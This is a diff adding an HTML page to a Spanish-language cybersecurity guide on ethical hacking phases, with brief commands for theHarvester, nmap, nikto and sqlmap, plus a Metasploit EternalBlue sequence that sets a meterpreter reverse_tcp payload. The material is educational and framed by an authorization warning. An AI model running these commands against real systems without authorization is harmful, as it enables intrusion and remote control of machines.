@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>06 - Hacking Ético y Pentesting</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+    <div class="reading-progress"></div>
+    <div class="bg-3d-container"></div>
+    <nav class="navbar-cyber navbar-expand-lg">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="../index.html">
+                <i class="fas fa-shield-halved"></i>
+                <span>CyberSec Guide</span>
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../index.html">Inicio</a>
+                    </li>
+                    <li class="nav-item dropdown">
+                        <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                            Secciones <i class="fas fa-chevron-down" style="font-size: 0.6rem; margin-left: 4px;"></i>
+                        </a>
+                        <ul class="dropdown-menu">
+                            <li><a class="dropdown-item" href="01-introduccion.html"><span class="dropdown-num">01</span> Introducción</a></li>
+                            <li><a class="dropdown-item" href="02-amenazas.html"><span class="dropdown-num">02</span> Amenazas</a></li>
+                            <li><a class="dropdown-item" href="03-redes.html"><span class="dropdown-num">03</span> Redes</a></li>
+                            <li><a class="dropdown-item" href="04-criptografia.html"><span class="dropdown-num">04</span> Criptografía</a></li>
+                            <li><a class="dropdown-item" href="05-sistemas.html"><span class="dropdown-num">05</span> Seguridad SO</a></li>
+                            <li><a class="dropdown-item" href="06-hacking.html"><span class="dropdown-num">06</span> Hacking Ético</a></li>
+                            <li><a class="dropdown-item" href="07-seguridad-web.html"><span class="dropdown-num">07</span> Seguridad Web</a></li>
+                            <li><a class="dropdown-item" href="08-forense.html"><span class="dropdown-num">08</span> Forense Digital</a></li>
+                            <li><a class="dropdown-item" href="09-normativas.html"><span class="dropdown-num">09</span> Normativas</a></li>
+                            <li><a class="dropdown-item" href="10-certificaciones.html"><span class="dropdown-num">10</span> Certificaciones</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../herramientas.html">Herramientas</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../comandos.html">Comandos</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../recursos.html">Recursos</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../index.html#about">Acerca de</a>
+                    </li>
+                    <li class="nav-item ms-2">
+                        <button class="theme-toggle" id="themeToggle" aria-label="Cambiar tema">
+                            <i class="fas fa-moon"></i>
+                            <span>Dark</span>
+                        </button>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <main class="section-page-content">
+        <div class="content-block">
+            <div class="section-header" style="text-align: left;">
+                <span class="difficulty-badge difficulty-advanced"><i class="fas fa-bolt"></i> Nivel Avanzado</span>
+                <h1 class="section-title" style="text-align: left; margin-top: 1rem;">Hacking Ético y Pentesting</h1>
+                <p class="section-description" style="text-align: left; margin: 0;">Metodologías, herramientas y técnicas de pruebas de penetración autorizadas.</p>
+            </div>
+
+            <div class="diagram-3d" style="height: 350px;"><canvas id="hack-canvas"></canvas></div>
+
+            <div class="alert-cyber alert-danger">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div><strong>⚠️ IMPORTANTE:</strong> Las técnicas mostradas aquí son SOLO para fines educativos y de pruebas autorizadas. Realizar pruebas de penetración sin autorización escrita es ILEGAL.</div>
+            </div>
+
+            <h2><i class="fas fa-route" style="color: var(--primary);"></i> Fases del Pentesting</h2>
+            <p>Un pentest profesional sigue una metodología estructurada de 5-6 fases.</p>
+
+            <div class="tabs-container">
+                <div class="tabs-nav">
+                    <button class="tab-btn active" data-tab="f1"><i class="fas fa-binoculars"></i> 1. Reconocimiento</button>
+                    <button class="tab-btn" data-tab="f2"><i class="fas fa-search"></i> 2. Escaneo</button>
+                    <button class="tab-btn" data-tab="f3"><i class="fas fa-bug"></i> 3. Explotación</button>
+                    <button class="tab-btn" data-tab="f4"><i class="fas fa-flag"></i> 4. Post-Explotación</button>
+                    <button class="tab-btn" data-tab="f5"><i class="fas fa-file-alt"></i> 5. Informe</button>
+                </div>
+                <div class="tab-content active" data-content="f1">
+                    <div class="card-cyber">
+                        <div class="card-title"><i class="fas fa-binoculars" style="color: var(--primary);"></i> Fase 1: Reconocimiento</div>
+                        <p class="card-text">Recopilación passiva de información sobre el objetivo SIN interactuar directamente con sus sistemas.</p>
+                        <div class="tools-grid">
+                            <div class="tool-card"><div class="tool-name">whois</div><div class="tool-desc">Información de registro de dominios</div></div>
+                            <div class="tool-card"><div class="tool-name">theHarvester</div><div class="tool-desc">Emails, subdominios, IPs públicas</div></div>
+                            <div class="tool-card"><div class="tool-name">Shodan</div><div class="tool-desc">Motor de búsqueda de dispositivos IoT</div></div>
+                            <div class="tool-card"><div class="tool-name">Google Dorking</div><div class="tool-desc">Búsquedas avanzadas en Google</div></div>
+                        </div>
+                        <div class="code-block" data-lang="bash">
+                            <code><span class="code-comment"># Reconocimiento con theHarvester</span>
+<span class="code-function">theHarvester</span> -d ejemplo.com -b google,linkedin -f report.html
+
+<span class="code-comment"># Google Dorks útiles</span>
+site:ejemplo.com filetype:pdf
+site:ejemplo.com inurl:admin
+intitle:"index of" "parent directory"</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="tab-content" data-content="f2">
+                    <div class="card-cyber">
+                        <div class="card-title"><i class="fas fa-search" style="color: var(--secondary);"></i> Fase 2: Escaneo</div>
+                        <p class="card-text">Escaneo activo para descubrir puertos, servicios, vulnerabilidades y versiones.</p>
+                        <div class="code-block" data-lang="bash">
+                            <code><span class="code-comment"># Nmap - Escáner de redes</span>
+<span class="code-function">nmap</span> -sV -sC -O -A ejemplo.com          <span class="code-comment"># Detección completa</span>
+<span class="code-function">nmap</span> -p- --min-rate 5000 ejemplo.com     <span class="code-comment"># Todos los puertos rápido</span>
+<span class="code-function">nmap</span> --script vuln ejemplo.com          <span class="code-comment"># Scan de vulnerabilidades</span>
+
+<span class="code-comment"># Nikto - Scanner web</span>
+<span class="code-function">nikto</span> -h https://ejemplo.com
+
+<span class="code-comment"># SQLmap - Inyección SQL automatizada</span>
+<span class="code-function">sqlmap</span> -u "https://ejemplo.com/page?id=1" --dbs --batch</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="tab-content" data-content="f3">
+                    <div class="card-cyber">
+                        <div class="card-title"><i class="fas fa-bug" style="color: var(--accent);"></i> Fase 3: Explotación</div>
+                        <p class="card-text">Aprovechamiento de vulnerabilidades descubiertas para obtener acceso no autorizado (con autorización).</p>
+                        <div class="tools-grid">
+                            <div class="tool-card"><div class="tool-name">Metasploit</div><div class="tool-desc">Framework de exploit más grande del mundo</div></div>
+                            <div class="tool-card"><div class="tool-name">Burp Suite</div><div class="tool-desc">Proxy y scanner para aplicaciones web</div></div>
+                            <div class="tool-card"><div class="tool-name">Cobalt Strike</div><div class="tool-desc">Plataforma profesional de adversary simulation</div></div>
+                        </div>
+                        <div class="code-block" data-lang="bash">
+                            <code><span class="code-comment"># Metasploit Framework</span>
+msfconsole
+
+<span class="code-comment"># Buscar exploit</span>
+msf6> search eternalblue
+
+<span class="code-comment"># Configurar y ejecutar</span>
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> set RHOSTS 192.168.1.100
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST 192.168.1.50
+msf6> exploit</code>
+                        </div>
+                    </div>
+                </div>
+                <div class="tab-content" data-content="f4">
+                    <div class="card-cyber">
+                        <div class="card-title"><i class="fas fa-flag" style="color: #00c853;"></i> Fase 4: Post-Explotación</div>
+                        <p class="card-text">Una vez dentro, se busca escalar privilegios, moverse lateralmente y persistir.</p>
+                        <ul>
+                            <li><strong>Escalada de privilegios:</strong> kernel exploits, SUID, misconfigurations</li>
+                            <li><strong>Movimiento lateral:</strong> pass-the-hash,PsExec, WMI</li>
+                            <li><strong>Persistencia:</strong> scheduled tasks, registry keys, backdoors</li>
+                            <li><strong>Exfiltración:</strong> robo de credenciales, datos sensibles</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="tab-content" data-content="f5">
+                    <div class="card-cyber">
+                        <div class="card-title"><i class="fas fa-file-alt" style="color: var(--primary);"></i> Fase 5: Informe</div>
+                        <p class="card-text">Documentación profesional de hallazgos, impacto y recomendaciones.</p>
+                        <h4 style="color: var(--primary);">Estructura del informe:</h4>
+                        <ol>
+                            <li>Resumen ejecutivo (para directivos)</li>
+                            <li>Alcance y metodología</li>
+                            <li>Hallazgos clasificados por severidad (CVSS)</li>
+                            <li>Evidencia de cada vulnerabilidad</li>
+                            <li>Recomendaciones con prioridad</li>
+                            <li>Plan de remediación con timeline</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+
+            <h2><i class="fas fa-laptop-code" style="color: var(--secondary);"></i> Entorno de Práctica</h2>
+            <div class="tools-grid">
+                <div class="tool-card"><div class="tool-name">Hack The Box</div><div class="tool-desc">Máquinas vulnerable para practicar offline</div></div>
+                <div class="tool-card"><div class="tool-name">TryHackMe</div><div class="tool-desc">Rutas de aprendizaje guiadas con labs</div></div>
+                <div class="tool-card"><div class="tool-name">VulnHub</div><div class="tool-desc">VMs descargables para práctica local</div></div>
+                <div class="tool-card"><div class="tool-name">PicoCTF</div><div class="tool-desc">Competencias CTF para principiantes</div></div>
+                <div class="tool-card"><div class="tool-name">OverTheWire</div><div class="tool-desc">Desafíos wargames de bandera a bandera</div></div>
+                <div class="tool-card"><div class="tool-name">DVWA</div><div class="tool-desc">Damn Vulnerable Web App para pentest web</div></div>
+            </div>
+
+            <div class="section-nav"></div>
+        </div>
+    </main>
+    <footer class="footer-cyber"><div class="container"><p><i class="fas fa-shield-halved" style="color: var(--primary);"></i> Guía de Ciberseguridad &copy; 2025</p></div></footer>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="../js/theme.js"></script>
+    <script src="../js/section-nav.js"></script>
+    <script>
+    (function(){
+        const canvas=document.getElementById('hack-canvas');if(!canvas||typeof THREE==='undefined')return;
+        const c=canvas.parentElement;const scene=new THREE.Scene();const cam=new THREE.PerspectiveCamera(60,c.clientWidth/c.clientHeight,0.1,1000);
+        const r=new THREE.WebGLRenderer({canvas,alpha:true,antialias:true});r.setSize(c.clientWidth,c.clientHeight);
+        const g=new THREE.Group();
+        // Terminal/Matrix representation
+        for(let i=0;i<40;i++){
+            const sg=new THREE.BoxGeometry(0.05,0.3+Math.random()*0.5,0.05);
+            const sm=new THREE.MeshBasicMaterial({color:0x00f0ff,transparent:true,opacity:0.2+Math.random()*0.3});
+            const s=new THREE.Mesh(sg,sm);
+            s.position.set((Math.random()-0.5)*10,(Math.random()-0.5)*6,(Math.random()-0.5)*3);g.add(s);
+        }
+        // Central skull/hacker symbol (simplified)
+        const skullG=new THREE.IcosahedronGeometry(0.8,1);
+        const skullM=new THREE.MeshBasicMaterial({color:0xff2e63,wireframe:true,transparent:true,opacity:0.5});
+        g.add(new THREE.Mesh(skullG,skullM));
+        scene.add(g);cam.position.z=5;
+        function animate(){requestAnimationFrame(animate);g.rotation.y+=0.004;g.rotation.x+=0.001;r.render(scene,cam);}
+        animate();
+        window.addEventListener('resize',()=>{cam.aspect=c.clientWidth/c.clientHeight;cam.updateProjectionMatrix();r.setSize(c.clientWidth,c.clientHeight);});
+    })();
+    </script>
+</body>
+</html>
